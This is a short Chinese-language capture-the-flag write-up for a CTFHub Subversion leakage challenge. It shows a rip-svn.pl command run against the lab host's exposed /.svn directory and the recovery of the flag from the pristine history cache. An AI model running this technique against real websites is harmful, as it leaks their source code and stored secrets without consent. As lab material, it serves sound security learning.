# CTFHUB_.svn

## 题目内容

```
信息泄露 - Subversion

Flag 在服务端旧版本的源代码中
```

## WriteUp
rip-svn下载文件（https://github.com/kost/dvcs-ripper）

此工具在Manjaro上的安装需要安装一些perl的依赖

```
sudo pacman -S svn
sudo pacman -S perl-io-socket-ssl
sudo pacman -S perl-dbd-sqlite
```

安装好后执行

```
./rip-svn.pl -u http://challenge-641b7526a40bf49f.sandbox.ctfhub.com:10800/.svn
```

得到结果如下

```
[i] Found new SVN client storage format!
REP INFO => 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33
[i] Trying to revert the tree, if you get error, upgrade your SVN client!
已恢复“index.html”
```

index.html中没有东西，我们进入.svn目录中寻找

```
cd .svn
```

得到目录

```
entries  format  pristine  text-base  tmp  wc.db  wc.db-journal
```

在wc.db中拿到了一个flagxxxx.txt的文件名，我们请求他，但是404

```
http://challenge-641b7526a40bf49f.sandbox.ctfhub.com:10800/flag_3014030442.txt
```

打开`pristine/`目录，找到flag

**注解**：pristine目录为历史缓存目录

## Reference

https://www.cnblogs.com/-qing-/p/10831130.html
